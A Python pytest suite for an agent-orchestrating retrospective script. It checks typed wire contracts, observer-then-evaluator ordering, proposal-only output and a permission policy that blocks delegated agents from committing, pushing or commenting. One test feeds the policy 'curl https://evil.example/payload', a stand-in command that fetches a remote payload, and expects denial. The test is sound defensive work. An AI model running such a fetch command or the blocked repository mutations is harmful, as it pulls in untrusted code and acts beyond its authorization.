#!/usr/bin/env python3
"""Tests for run_retrospective.py (Issue #2237).

Fixture/mock-based only (Runtime Verification Applicability: deferred -- see
Issue #2237 body). No live GitHub/Web/git/Agent call is ever made; every I/O
boundary (``base_sha_resolver``, collectors, Agent invocation ``runner``) is
dependency-injected.

Covers every Issue #2237 AC that is a pytest -k target:
  AC2  skill_md_under_500_lines
  AC7  wire_contract_dataclass_roundtrip
  AC8  base_sha_fixed_once
  AC9  evaluator_waits_for_observer
  AC10 evaluator_receives_typed_projection_only
  AC11 no_mutation_side_effect
  AC13 production_agent_invocation_adapter
  AC14 schema_repair_retry_bounded
  AC15 previous_state_provider_five_states
  AC16 publish_request_forbidden_fields
  AC17 delegated_agent_mutation_denied
  AC18 temp_artifact_cleanup_all_paths
"""

from __future__ import annotations

import dataclasses
import json
import os
import signal
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest

_SCRIPTS_DIR = Path(__file__).resolve().parents[1]
_SKILL_DIR = _SCRIPTS_DIR.parent
sys.path.insert(0, str(_SCRIPTS_DIR))

import run_retrospective as rr  # noqa: E402

_FULL_SHA = "a" * 40
_OTHER_SHA = "b" * 40


# ---------------------------------------------------------------------------
# AC2: SKILL.md line-count assertion
# ---------------------------------------------------------------------------


def test_skill_md_under_500_lines() -> None:
    skill_md = _SKILL_DIR / "SKILL.md"
    assert skill_md.is_file(), f"missing {skill_md}"
    line_count = len(skill_md.read_text(encoding="utf-8").splitlines())
    assert line_count < 500, f"SKILL.md has {line_count} lines, must be < 500"


# ---------------------------------------------------------------------------
# AC7: wire contract dataclass round-trip
# ---------------------------------------------------------------------------

_WIRE_CLASSES = [rr.SourcePlan, rr.EvidenceBundle, rr.FindingSet, rr.Evaluation, rr.PublishRequest]


@pytest.mark.parametrize("cls", _WIRE_CLASSES)
def test_wire_contract_dataclass_roundtrip_is_dataclass(cls: type) -> None:
    assert dataclasses.is_dataclass(cls)
    field_names = {f.name for f in dataclasses.fields(cls)}
    assert "schema_version" in field_names


def _sample_source_plan() -> rr.SourcePlan:
    return rr.SourcePlan(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest="digest-1",
        sources=["repository"],
        generated_at="2026-01-01T00:00:00Z",
    )


def _sample_evidence_bundle() -> rr.EvidenceBundle:
    return rr.EvidenceBundle(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest="digest-1",
        observer_id="runtime-observer",
        evidence_ref="evidence://run-1/observer-1",
        findings=[{"claim": "example finding", "claim_class": "process"}],
    )


def _sample_finding_set() -> rr.FindingSet:
    return rr.FindingSet(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest="digest-1",
        observer_id="runtime-observer",
        findings=[{"claim": "example finding", "claim_class": "process"}],
    )


def _sample_evaluation() -> rr.Evaluation:
    return rr.Evaluation(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest="digest-1",
        candidate_records=[{"finding_identity": "fid-1", "severity": "medium"}],
        evidence_ref="evidence://run-1/evaluation",
    )


def _sample_publish_request() -> rr.PublishRequest:
    return rr.PublishRequest(
        request_id="req-1",
        repository_id="squne121/loop-protocol",
        target_issue=2237,
        run_identity={"run_id": "run-1", "base_sha": _FULL_SHA, "source_set_digest": "digest-1"},
        candidate_records=[{"finding_identity": "fid-1", "severity": "medium"}],
        expected_previous_digest=None,
        idempotency_key="idem-1",
        public_projection_digest="a" * 64,
        authorization_required=True,
    )


_SAMPLE_BUILDERS = {
    rr.SourcePlan: _sample_source_plan,
    rr.EvidenceBundle: _sample_evidence_bundle,
    rr.FindingSet: _sample_finding_set,
    rr.Evaluation: _sample_evaluation,
    rr.PublishRequest: _sample_publish_request,
}


@pytest.mark.parametrize("cls", _WIRE_CLASSES)
def test_wire_contract_dataclass_roundtrip(cls: type) -> None:
    instance = _SAMPLE_BUILDERS[cls]()
    wire_text = instance.to_wire()
    # GIVEN a serialized Agent output string (not a hand-built dataclass)
    # WHEN it is parsed via the strict deserializer
    parsed = cls.from_wire(wire_text)
    # THEN re-serializing it is byte-identical (round-trip invariant)
    assert parsed.to_wire() == wire_text
    assert parsed == instance


@pytest.mark.parametrize("cls", _WIRE_CLASSES)
def test_wire_contract_dataclass_roundtrip_rejects_unknown_field(cls: type) -> None:
    instance = _SAMPLE_BUILDERS[cls]()
    payload = json.loads(instance.to_wire())
    payload["unexpected_extra_field"] = "smuggled"
    with pytest.raises(rr.WireContractError) as excinfo:
        cls.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "unknown_field"


@pytest.mark.parametrize("cls", _WIRE_CLASSES)
def test_wire_contract_dataclass_roundtrip_rejects_missing_field(cls: type) -> None:
    instance = _SAMPLE_BUILDERS[cls]()
    payload = json.loads(instance.to_wire())
    del payload["schema_version"]
    with pytest.raises(rr.WireContractError) as excinfo:
        cls.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "missing_field"


def test_wire_contract_dataclass_roundtrip_rejects_malformed_json() -> None:
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.SourcePlan.from_wire("{not valid json")
    assert excinfo.value.reason_code == "decode_failure"


def test_wire_contract_dataclass_roundtrip_rejects_oversize() -> None:
    huge_findings = [{"claim": "x" * 1000}] * 400
    bundle = rr.EvidenceBundle(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest="digest-1",
        observer_id="o",
        evidence_ref="e",
        findings=huge_findings,
    )
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.EvidenceBundle.from_wire(bundle.to_wire())
    assert excinfo.value.reason_code == "oversize"


def test_wire_contract_dataclass_roundtrip_run_id_agreement() -> None:
    plan = _sample_source_plan()
    bundle = _sample_evidence_bundle()
    rr.validate_run_id_agreement(plan, bundle)  # same run_id -> no raise
    mismatched = dataclasses.replace(bundle, run_id="different-run")
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.validate_run_id_agreement(plan, mismatched)
    assert excinfo.value.reason_code == "run_id_mismatch"


# ---------------------------------------------------------------------------
# AC8: base_sha fixed exactly once
# ---------------------------------------------------------------------------


def test_base_sha_fixed_once() -> None:
    call_count = {"n": 0}

    def resolver() -> str:
        call_count["n"] += 1
        return _FULL_SHA

    ctx = rr.RunContext(base_sha_resolver=resolver)
    for _ in range(5):
        assert ctx.base_sha == _FULL_SHA
    assert call_count["n"] == 1
    assert ctx.resolve_count == 1


def test_base_sha_fixed_once_across_prepare_collectors() -> None:
    call_count = {"n": 0}

    def resolver() -> str:
        call_count["n"] += 1
        return _FULL_SHA

    seen_base_shas: list[str] = []

    def make_collector(source_id: str):
        def _collector(base_sha: str):
            seen_base_shas.append(base_sha)
            return _fake_collector_result(source_id, base_sha)

        return _collector

    collectors = [make_collector("repository"), make_collector("github"), make_collector("web")]
    ctx, plan, results = rr.prepare(base_sha_resolver=resolver, collectors=collectors, run_id="run-1")
    assert call_count["n"] == 1
    assert seen_base_shas == [_FULL_SHA, _FULL_SHA, _FULL_SHA]
    assert plan.base_sha == _FULL_SHA
    assert len(results) == 3


def test_base_sha_fixed_once_rejects_non_full_sha() -> None:
    ctx = rr.RunContext(base_sha_resolver=lambda: "short-sha")
    with pytest.raises(ValueError):
        _ = ctx.base_sha


# ---------------------------------------------------------------------------
# helpers shared by AC9/AC10/AC11/AC13/AC14
# ---------------------------------------------------------------------------


class _FakeCollectorResult:
    def __init__(self, observation: dict[str, Any]) -> None:
        self.observation = observation
        self.private_evidence: dict[str, Any] = {}


def _fake_collector_result(source_id: str, base_sha: str) -> _FakeCollectorResult:
    return _FakeCollectorResult(
        {
            "source_type": "repository" if source_id == "repository" else "github",
            "source_id": source_id,
            "source_status": "complete",
            "pagination_completeness": "complete",
        }
    )


def _ok_agent_result(payload: dict[str, Any]) -> rr.AgentInvocationResult:
    return rr.AgentInvocationResult(
        status="ok", structured_output=payload, raw_stdout_excerpt=None, exit_code=0, reason_code=None
    )


def _observer_request(agent_name: str) -> rr.AgentInvocationRequest:
    return rr.AgentInvocationRequest(
        agent_name=agent_name,
        prompt="observe",
        json_schema_path="/tmp/schema.json",
        cwd="/repo",
    )


def _make_observer_invoke(run_id: str, digest: str, call_log: list[str]):
    def _invoke(request: rr.AgentInvocationRequest) -> rr.AgentInvocationResult:
        call_log.append(f"observer:{request.agent_name}")
        bundle = rr.EvidenceBundle(
            run_id=run_id,
            base_sha=_FULL_SHA,
            source_set_digest=digest,
            observer_id=request.agent_name,
            evidence_ref=f"evidence://{run_id}/{request.agent_name}",
            findings=[{"claim": f"finding from {request.agent_name}", "claim_class": "process"}],
        )
        return _ok_agent_result(json.loads(bundle.to_wire()))

    return _invoke


def _make_evaluator_invoke(run_id: str, digest: str, call_log: list[str]):
    def _invoke(request: rr.EvaluatorRequest) -> rr.AgentInvocationResult:
        call_log.append("evaluator")
        evaluation = rr.Evaluation(
            run_id=run_id,
            base_sha=_FULL_SHA,
            source_set_digest=digest,
            candidate_records=[{"finding_identity": "fid-1", "severity": "medium"}],
            evidence_ref=f"evidence://{run_id}/evaluation",
        )
        return _ok_agent_result(json.loads(evaluation.to_wire()))

    return _invoke


def _run_full_pipeline(call_log: list[str]) -> tuple[rr.RunContext, rr.SourcePlan, rr.PublishRequest]:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    observer_requests = [
        _observer_request("retrospective-runtime-observer"),
        _observer_request("codebase-investigator"),
    ]
    bundles = rr.run_observer_wave(
        ctx,
        plan,
        invoke=_make_observer_invoke(ctx.run_id, plan.source_set_digest, call_log),
        observer_requests=observer_requests,
    )
    finding_sets = rr.build_finding_sets(ctx, plan, bundles)
    evaluator_request = rr.prepare_evaluator_request(ctx, plan, finding_sets)
    evaluation = rr.run_evaluation(
        ctx, evaluator_request, invoke_evaluator=_make_evaluator_invoke(ctx.run_id, plan.source_set_digest, call_log)
    )
    publish_request = rr.finalize(
        ctx,
        plan,
        evaluation,
        repository_id="squne121/loop-protocol",
        target_issue=2237,
        request_id="req-1",
        idempotency_key="idem-1",
    )
    return ctx, plan, publish_request


# ---------------------------------------------------------------------------
# AC9: evaluator waits for observer wave completion
# ---------------------------------------------------------------------------


def test_evaluator_waits_for_observer_call_order() -> None:
    call_log: list[str] = []
    _run_full_pipeline(call_log)
    assert call_log == [
        "observer:retrospective-runtime-observer",
        "observer:codebase-investigator",
        "evaluator",
    ]


def test_evaluator_waits_for_observer_never_invoked_on_observer_failure() -> None:
    call_log: list[str] = []
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )

    def _failing_invoke(request: rr.AgentInvocationRequest) -> rr.AgentInvocationResult:
        call_log.append(f"observer:{request.agent_name}")
        return rr.AgentInvocationResult(
            status="timeout", structured_output=None, raw_stdout_excerpt=None, exit_code=None, reason_code="timeout"
        )

    def _evaluator_invoke_should_never_run(request: rr.EvaluatorRequest) -> rr.AgentInvocationResult:
        call_log.append("evaluator")
        raise AssertionError("evaluator must not be invoked when the observer wave failed")

    with pytest.raises(rr.ObserverWaveFailed):
        bundles = rr.run_observer_wave(
            ctx, plan, invoke=_failing_invoke, observer_requests=[_observer_request("retrospective-runtime-observer")]
        )
        finding_sets = rr.build_finding_sets(ctx, plan, bundles)
        evaluator_request = rr.prepare_evaluator_request(ctx, plan, finding_sets)
        rr.run_evaluation(ctx, evaluator_request, invoke_evaluator=_evaluator_invoke_should_never_run)

    assert call_log == ["observer:retrospective-runtime-observer"]
    assert "evaluator" not in call_log


# ---------------------------------------------------------------------------
# AC10: evaluator only ever receives a typed, schema-controlled projection
# ---------------------------------------------------------------------------


def test_evaluator_receives_typed_projection_only() -> None:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    bundle = rr.EvidenceBundle(
        run_id=ctx.run_id,
        base_sha=_FULL_SHA,
        source_set_digest=plan.source_set_digest,
        observer_id="runtime-observer",
        evidence_ref="evidence://run-1/observer-1",
        findings=[{"claim": "example finding", "claim_class": "process"}],
    )
    finding_sets = rr.build_finding_sets(ctx, plan, [bundle])
    evaluator_request = rr.prepare_evaluator_request(ctx, plan, finding_sets)

    captured: dict[str, Any] = {}

    def _capturing_invoke(request: rr.EvaluatorRequest) -> rr.AgentInvocationResult:
        captured["request"] = request
        captured["wire_text"] = request.to_wire()
        evaluation = rr.Evaluation(
            run_id=ctx.run_id,
            base_sha=_FULL_SHA,
            source_set_digest=plan.source_set_digest,
            candidate_records=[],
            evidence_ref="e",
        )
        return _ok_agent_result(json.loads(evaluation.to_wire()))

    rr.run_evaluation(ctx, evaluator_request, invoke_evaluator=_capturing_invoke)

    # THEN the evaluator request never has an `evidence_ref` or raw-evidence-shaped field
    payload = json.loads(captured["wire_text"])
    assert set(payload.keys()) == {f.name for f in dataclasses.fields(rr.EvaluatorRequest)}
    assert "evidence_ref" not in payload
    assert "private_evidence" not in payload
    for finding_set_dict in payload["finding_sets"]:
        assert "evidence_ref" not in finding_set_dict
        assert "private_evidence" not in finding_set_dict


def test_evaluator_receives_typed_projection_only_rejects_raw_evidence_field() -> None:
    # GIVEN an attempt to smuggle a raw evidence channel into EVALUATOR_REQUEST_V1
    payload = json.loads(rr.EvaluatorRequest(run_id="r", base_sha=_FULL_SHA, source_set_digest="d").to_wire())
    payload["private_evidence"] = {"stdout": "raw log dump"}
    # THEN strict deserialization rejects it structurally
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.EvaluatorRequest.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "unknown_field"


# ---------------------------------------------------------------------------
# AC11: run_retrospective.py performs no GitHub/Issue mutation (proposal-only)
# ---------------------------------------------------------------------------


def test_no_mutation_side_effect(monkeypatch: pytest.MonkeyPatch) -> None:
    recorded_subprocess_calls: list[list[str]] = []

    def _spy_run(argv: list[str], **_kwargs: Any) -> subprocess.CompletedProcess:
        recorded_subprocess_calls.append(list(argv))
        raise AssertionError("this test's phases must never invoke subprocess.run directly")

    monkeypatch.setattr(subprocess, "run", _spy_run)

    call_log: list[str] = []
    _ctx, _plan, publish_request = _run_full_pipeline(call_log)

    # THEN no subprocess call happened at all (prepare/validate-observers/
    # prepare-evaluator/finalize never shell out; the root Skill is
    # responsible for actual Agent invocation)
    assert recorded_subprocess_calls == []
    # AND the only produced artifact is a proposal-only PublishRequest
    assert isinstance(publish_request, rr.PublishRequest)
    payload = json.loads(publish_request.to_wire())
    assert rr.PUBLISH_REQUEST_FORBIDDEN_FIELDS.isdisjoint(payload.keys())
    assert publish_request.authorization_required is True


def test_no_mutation_side_effect_denies_mutation_argv_via_permission_policy() -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    for dangerous in ("git commit -m x", "git push origin main", "gh issue comment 1 --body x", "gh pr merge 1"):
        with pytest.raises(rr.PermissionDenied):
            policy.check_bash(dangerous)


# ---------------------------------------------------------------------------
# AC13: production Agent invocation adapter (subprocess mock harness)
# ---------------------------------------------------------------------------


def _invocation_request() -> rr.AgentInvocationRequest:
    return rr.AgentInvocationRequest(
        agent_name="retrospective-runtime-observer", prompt="observe", json_schema_path="/tmp/s.json", cwd="/repo"
    )


def test_production_agent_invocation_adapter_argv_shape() -> None:
    request = _invocation_request()
    argv = rr.build_agent_invocation_argv(request)
    assert argv[:2] == ["claude", "-p"]
    assert "--output-format" in argv and argv[argv.index("--output-format") + 1] == "json"
    assert "--json-schema" in argv and argv[argv.index("--json-schema") + 1] == request.json_schema_path
    assert "--bare" not in argv


def test_production_agent_invocation_adapter_success() -> None:
    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps({"ok": True}), stderr="")

    result = rr.invoke_agent(_invocation_request(), runner=_runner)
    assert result.status == "ok"
    assert result.structured_output == {"ok": True}


def test_production_agent_invocation_adapter_timeout() -> None:
    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        raise subprocess.TimeoutExpired(cmd=argv, timeout=kwargs.get("timeout", 300))

    result = rr.invoke_agent(_invocation_request(), runner=_runner)
    assert result.status == "timeout"
    assert result.reason_code == "timeout"


def test_production_agent_invocation_adapter_sigterm() -> None:
    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(argv, returncode=-signal.SIGTERM, stdout="", stderr="")

    result = rr.invoke_agent(_invocation_request(), runner=_runner)
    assert result.status == "terminated"
    assert result.reason_code == "sigterm"


def test_production_agent_invocation_adapter_api_error() -> None:
    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(argv, returncode=1, stdout="", stderr="internal error")

    result = rr.invoke_agent(_invocation_request(), runner=_runner)
    assert result.status == "api_error"
    assert result.reason_code == "nonzero_exit"


def test_production_agent_invocation_adapter_partial_result() -> None:
    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(
            argv, returncode=0, stdout=json.dumps({"is_error": True, "result": "partial text"}), stderr=""
        )

    result = rr.invoke_agent(_invocation_request(), runner=_runner)
    assert result.status == "partial_result"
    assert result.reason_code == "api_error_with_partial_text"


def test_production_agent_invocation_adapter_malformed_structured_output() -> None:
    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(argv, returncode=0, stdout="not-json-at-all", stderr="")

    result = rr.invoke_agent(_invocation_request(), runner=_runner)
    assert result.status == "malformed_output"
    assert result.reason_code == "json_decode_failure"


# ---------------------------------------------------------------------------
# AC14: schema repair retry bounded to exactly 1
# ---------------------------------------------------------------------------


def test_schema_repair_retry_bounded_succeeds_after_one_repair() -> None:
    good = rr.EvidenceBundle(run_id="r", base_sha=_FULL_SHA, source_set_digest="d", observer_id="o", evidence_ref="e")
    bad_text = "{not valid json"
    repair_calls = {"n": 0}

    def _repair(text: str, error: rr.WireContractError) -> str:
        repair_calls["n"] += 1
        return good.to_wire()

    result = rr.parse_agent_output_with_repair(bad_text, rr.EvidenceBundle, repair=_repair)
    assert result == good
    assert repair_calls["n"] == 1


def test_schema_repair_retry_bounded_exhausts_after_one_retry() -> None:
    repair_calls = {"n": 0}

    def _repair(text: str, error: rr.WireContractError) -> str:
        repair_calls["n"] += 1
        return "{still not valid"

    with pytest.raises(rr.SchemaRepairExhausted):
        rr.parse_agent_output_with_repair("{not valid json", rr.EvidenceBundle, repair=_repair)
    # SCHEMA_REPAIR_RETRIES == 1 -> repair is invoked exactly once, never more
    assert repair_calls["n"] == 1
    assert rr.SCHEMA_REPAIR_RETRIES == 1


def test_schema_repair_retry_bounded_evaluator_never_started_on_exhaustion() -> None:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    evaluator_called = {"n": 0}

    def _malformed_invoke(request: rr.AgentInvocationRequest) -> rr.AgentInvocationResult:
        return _ok_agent_result({"totally": "wrong-shape"})

    def _evaluator_invoke(request: rr.EvaluatorRequest) -> rr.AgentInvocationResult:
        evaluator_called["n"] += 1
        raise AssertionError("evaluator must never start after schema repair exhaustion")

    with pytest.raises(rr.SchemaRepairExhausted):
        bundles = rr.run_observer_wave(ctx, plan, invoke=_malformed_invoke, observer_requests=[_observer_request("o1")])
        finding_sets = rr.build_finding_sets(ctx, plan, bundles)
        evaluator_request = rr.prepare_evaluator_request(ctx, plan, finding_sets)
        rr.run_evaluation(ctx, evaluator_request, invoke_evaluator=_evaluator_invoke)

    assert evaluator_called["n"] == 0


# ---------------------------------------------------------------------------
# AC15: PreviousStateProvider 5 states + delta computation
# ---------------------------------------------------------------------------


def test_previous_state_provider_five_states_status_values() -> None:
    assert rr.PREVIOUS_STATE_STATUSES == {"available", "no_history", "legacy_unavailable", "partial", "stale"}
    provider = rr.FixturePreviousStateProvider(fixtures={})
    result = provider.get(repository_id="squne121/loop-protocol", scope="global", finding_identity_algorithm="v1")
    assert result.status == "no_history"


@pytest.mark.parametrize("status", sorted(rr.PREVIOUS_STATE_STATUSES))
def test_previous_state_provider_five_states_constructible(status: str) -> None:
    result = rr.PreviousStateResult(
        status=status, previous_run_ref="run-0" if status != "no_history" else None, candidates=[], read_version=None
    )
    assert result.status == status


def test_previous_state_provider_five_states_rejects_invalid_status() -> None:
    with pytest.raises(ValueError):
        rr.PreviousStateResult(status="bogus", previous_run_ref=None, candidates=[], read_version=None)


def test_previous_state_provider_five_states_delta_new_from_no_history() -> None:
    previous = rr.PreviousStateResult(status="no_history", previous_run_ref=None, candidates=[], read_version=None)
    delta = rr.compute_delta(previous, [{"finding_identity": "fid-1", "severity": "medium"}])
    assert delta == [{"finding_identity": "fid-1", "delta_status": "new"}]


def test_previous_state_provider_five_states_delta_legacy_unavailable_is_new() -> None:
    previous = rr.PreviousStateResult(
        status="legacy_unavailable", previous_run_ref=None, candidates=[], read_version=None
    )
    delta = rr.compute_delta(previous, [{"finding_identity": "fid-1", "severity": "low"}])
    assert delta == [{"finding_identity": "fid-1", "delta_status": "new"}]


def test_previous_state_provider_five_states_delta_unchanged() -> None:
    previous = rr.PreviousStateResult(
        status="available",
        previous_run_ref="run-0",
        candidates=[{"finding_identity": "fid-1", "severity": "medium", "candidate_status": "open"}],
        read_version="v1",
    )
    delta = rr.compute_delta(
        previous, [{"finding_identity": "fid-1", "severity": "medium", "candidate_status": "open"}]
    )
    assert delta == [{"finding_identity": "fid-1", "delta_status": "unchanged"}]


def test_previous_state_provider_five_states_delta_regressed() -> None:
    previous = rr.PreviousStateResult(
        status="partial",
        previous_run_ref="run-0",
        candidates=[{"finding_identity": "fid-1", "severity": "low", "candidate_status": "open"}],
        read_version="v1",
    )
    delta = rr.compute_delta(previous, [{"finding_identity": "fid-1", "severity": "high", "candidate_status": "open"}])
    assert delta == [{"finding_identity": "fid-1", "delta_status": "regressed"}]


def test_previous_state_provider_five_states_delta_recurrent() -> None:
    previous = rr.PreviousStateResult(
        status="stale",
        previous_run_ref="run-0",
        candidates=[{"finding_identity": "fid-1", "severity": "medium", "candidate_status": "resolved"}],
        read_version="v1",
    )
    delta = rr.compute_delta(
        previous, [{"finding_identity": "fid-1", "severity": "medium", "candidate_status": "open"}]
    )
    assert delta == [{"finding_identity": "fid-1", "delta_status": "recurrent"}]


def test_previous_state_provider_five_states_delta_resolved() -> None:
    previous = rr.PreviousStateResult(
        status="available",
        previous_run_ref="run-0",
        candidates=[{"finding_identity": "fid-1", "severity": "medium", "candidate_status": "open"}],
        read_version="v1",
    )
    delta = rr.compute_delta(previous, [])
    assert delta == [{"finding_identity": "fid-1", "delta_status": "resolved"}]


# ---------------------------------------------------------------------------
# AC16: PublishRequest forbidden fields
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("forbidden_field", sorted(rr.PUBLISH_REQUEST_FORBIDDEN_FIELDS))
def test_publish_request_forbidden_fields_rejected(forbidden_field: str) -> None:
    payload = json.loads(_sample_publish_request().to_wire())
    payload[forbidden_field] = "smuggled-authority"
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.PublishRequest.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "unknown_field"


def test_publish_request_forbidden_fields_valid_envelope_accepted() -> None:
    instance = _sample_publish_request()
    parsed = rr.PublishRequest.from_wire(instance.to_wire())
    expected_keys = {
        "schema_version",
        "request_id",
        "repository_id",
        "target_issue",
        "run_identity",
        "candidate_records",
        "expected_previous_digest",
        "idempotency_key",
        "public_projection_digest",
        "authorization_required",
    }
    assert {f.name for f in dataclasses.fields(rr.PublishRequest)} == expected_keys
    assert parsed == instance


def test_publish_request_forbidden_fields_authorization_required_must_be_true() -> None:
    payload = json.loads(_sample_publish_request().to_wire())
    payload["authorization_required"] = False
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.PublishRequest.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "invalid_value"


# ---------------------------------------------------------------------------
# AC17: delegated Agent mutation attempts are denied
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "git commit -m 'sneaky commit'",
        "git push origin main",
        "gh issue comment 2237 --body hi",
        "gh pr merge 1 --squash",
        "gh api repos/x/y/issues/1/comments -f body=hi",
    ],
)
def test_delegated_agent_mutation_denied_bash(command: str) -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    with pytest.raises(rr.PermissionDenied):
        policy.check_bash(command)


def test_delegated_agent_mutation_denied_unapproved_bash() -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1", allowed_bash_commands=frozenset({"echo hi"}))
    policy.check_bash("echo hi")  # allowlisted -> no raise
    with pytest.raises(rr.PermissionDenied):
        policy.check_bash("curl https://evil.example/payload")


def test_delegated_agent_mutation_denied_filesystem_write() -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    with pytest.raises(rr.PermissionDenied):
        policy.check_filesystem_write("/repo/some-file.txt")


@pytest.mark.parametrize("tool_name", ["Write", "Edit", "MultiEdit", "NotebookEdit", "Agent", "Skill"])
def test_delegated_agent_mutation_denied_tool_callback(tool_name: str) -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    with pytest.raises(rr.PermissionDenied):
        policy.check_tool(tool_name)


def test_delegated_agent_mutation_denied_cross_run_resume() -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    policy.check_resume("run-1")  # same run -> no raise
    with pytest.raises(rr.PermissionDenied):
        policy.check_resume("run-2")


# ---------------------------------------------------------------------------
# AC18: run-scoped temp artifact dir cleanup on all 4 exit paths
# ---------------------------------------------------------------------------


def test_temp_artifact_cleanup_all_paths_success(tmp_path: Path) -> None:
    created_path_holder: dict[str, Path] = {}
    with rr.run_scoped_temp_dir("run-success", base_dir=tmp_path) as path:
        created_path_holder["path"] = path
        assert path.is_dir()
        assert (path.stat().st_mode & 0o777) == 0o700
    assert not created_path_holder["path"].exists()


def test_temp_artifact_cleanup_all_paths_exception(tmp_path: Path) -> None:
    created_path_holder: dict[str, Path] = {}
    with pytest.raises(ValueError):
        with rr.run_scoped_temp_dir("run-exception", base_dir=tmp_path) as path:
            created_path_holder["path"] = path
            raise ValueError("boom")
    assert not created_path_holder["path"].exists()


def test_temp_artifact_cleanup_all_paths_sigint(tmp_path: Path) -> None:
    created_path_holder: dict[str, Path] = {}
    with pytest.raises(rr.RunInterrupted) as excinfo:
        with rr.run_scoped_temp_dir("run-sigint", base_dir=tmp_path) as path:
            created_path_holder["path"] = path
            os.kill(os.getpid(), signal.SIGINT)
    assert excinfo.value.signum == signal.SIGINT
    assert not created_path_holder["path"].exists()


def test_temp_artifact_cleanup_all_paths_sigterm(tmp_path: Path) -> None:
    created_path_holder: dict[str, Path] = {}
    with pytest.raises(rr.RunInterrupted) as excinfo:
        with rr.run_scoped_temp_dir("run-sigterm", base_dir=tmp_path) as path:
            created_path_holder["path"] = path
            os.kill(os.getpid(), signal.SIGTERM)
    assert excinfo.value.signum == signal.SIGTERM
    assert not created_path_holder["path"].exists()


def test_temp_artifact_cleanup_all_paths_restores_previous_handlers(tmp_path: Path) -> None:
    previous_sigint = signal.getsignal(signal.SIGINT)
    previous_sigterm = signal.getsignal(signal.SIGTERM)
    with rr.run_scoped_temp_dir("run-restore", base_dir=tmp_path):
        pass
    assert signal.getsignal(signal.SIGINT) == previous_sigint
    assert signal.getsignal(signal.SIGTERM) == previous_sigterm


# ---------------------------------------------------------------------------
# In Scope: manual trigger preflight (not a numbered AC's own -k target, but
# exercised as a bundled scenario)
# ---------------------------------------------------------------------------


def test_manual_trigger_preflight_rejects_non_git_root(tmp_path: Path) -> None:
    with pytest.raises(ValueError):
        rr.manual_trigger_preflight(repo_root=tmp_path)


def test_manual_trigger_preflight_accepts_git_root() -> None:
    repo_root = _SCRIPTS_DIR.parents[3]
    rr.manual_trigger_preflight(repo_root=repo_root)  # no raise
